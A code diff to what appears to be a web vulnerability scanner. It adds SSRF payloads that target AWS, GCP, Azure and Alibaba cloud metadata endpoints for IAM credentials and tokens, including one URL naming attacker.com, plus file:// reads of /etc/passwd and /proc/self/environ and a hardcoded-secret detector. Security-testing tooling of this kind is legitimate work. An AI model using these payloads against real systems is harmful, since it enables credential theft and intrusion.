@@ -2388,20 +2388,26 @@ _SSRF_PARAM = re.compile(
     r"url|uri|link|src|source|dest|target|redirect|feed|image|img|host|domain|callback|"
     r"webhook|proxy|fetch|remote|load|open|site|endpoint|server|address|api|next|"
     r"return|continue|to|out|data|resource|path|file|document|view|window|port", re.I)
-# (payload, response-marker, what-it-proves). The metadata/IMDS hits are credential theft.
+# (payload, response-marker, what-it-proves). Extended cloud metadata + file:// disclosure.
 _SSRF_PAYLOADS = [
     ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      re.compile(r"AccessKeyId|SecretAccessKey|\bToken\b|Expiration"),
-     "AWS IAM role credentials via the instance metadata service (IMDSv1)"),
-    ("http://169.254.169.254/latest/meta-data/",
-     re.compile(r"ami-id|instance-id|instance-action|local-ipv4|iam/|placement/|"
-                r"security-credentials"),
-     "AWS instance metadata (IMDSv1)"),
-    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
-     re.compile(r"default/|service-accounts|scopes|email"),
-     "GCP instance metadata (service-account tokens)"),
+     "AWS IAM credentials via IMDS"),
+    ("http://169.254.169.254/latest/user-data",
+     re.compile(r"#!/bin|aws|password|secret|key", re.I),
+     "AWS user-data script (may contain creds)"),
+    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=http://attacker.com",
+     re.compile(r"eyJ"), "GCP service-account identity token (JWT)"),
+    ("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+     re.compile(r"vmId|subscriptionId|resourceGroupName"),
+     "Azure compute instance metadata"),
+    ("http://100.100.100.200/latest/meta-data/",
+     re.compile(r"instance-id|hostname|region"),
+     "Alibaba Cloud instance metadata"),
     ("file:///etc/passwd", re.compile(r"root:.*:0:0:"),
-     "local file /etc/passwd via the file:// scheme"),
+     "local file /etc/passwd via file://"),
+    ("file:///proc/self/environ", re.compile(r"PATH|HOME|USER|SECRET|KEY", re.I),
+     "/proc/self/environ via file:// (environment variables leak)"),
 ]
 
 
@@ -2735,6 +2741,20 @@ def _discover_vhosts(ip: str, port: Port, base: str, host_hint: str,
     return [f, *extra], [n for n, _, _ in found]
 
 
+def _extract_api_keys(body: str) -> list[Vuln] | None:
+    """Scan JavaScript for hardcoded API keys, tokens, secrets."""
+    patterns = [
+        (r"(?:api[_-]?)?key['\"]?\s*[:=]\s*['\"]([a-z0-9]{20,})['\"]", "API key"),
+        (r"authorization['\"]?\s*[:=]\s*['\"]Bearer\s+([a-z0-9\-_.]+)['\"]", "Bearer token"),
+        (r"(?:aws|amazon)[_-]?(?:access|secret)[_-]?key['\"]?\s*[:=]\s*['\"]([A-Z0-9]{16,})['\"]", "AWS key"),
+        (r"stripe[_-]?(?:public|secret)[_-]?key['\"]?\s*[:=]\s*['\"]([a-z]{2}_[a-z0-9]{24,})['\"]", "Stripe key"),
+    ]
+    for pattern, key_type in patterns:
+        if re.search(pattern, body, re.I):
+            return key_type
+    return None
+
+
 def scan_endpoint(ip: str, port: Port, active: bool = True,
                   auth: dict | None = None, creds: bool = False,
                   host_hint: str = "", upload_shell: bool = False,
@@ -2773,6 +2793,15 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
     if root:
         findings.extend(_scan_jwts(ip, port, headers, body, active=active))
         findings.extend(_scan_deserial(ip, port, headers, body))
+        # Deep: API key extraction from JS
+        key_type = _extract_api_keys(body)
+        if key_type:
+            findings.append(_mk(ip, port, "web-hardcoded-secret", "critical",
+                f"Hardcoded {key_type} in response", ["CWE-798", "CWE-215"],
+                f"Found {key_type} embedded in the page (likely JavaScript). "
+                f"This credential can be used to access the service on behalf of the application.",
+                "Remove all credentials from client-side code; use server-side token endpoints",
+                confidence="confirmed"))
     # The active HTTP checks only make sense if the port actually spoke HTTP -
     # skip them for a TLS-only non-HTTP port (LDAPS/IMAPS) so we don't waste a
     # dozen dead requests there (its TLS findings above still count).
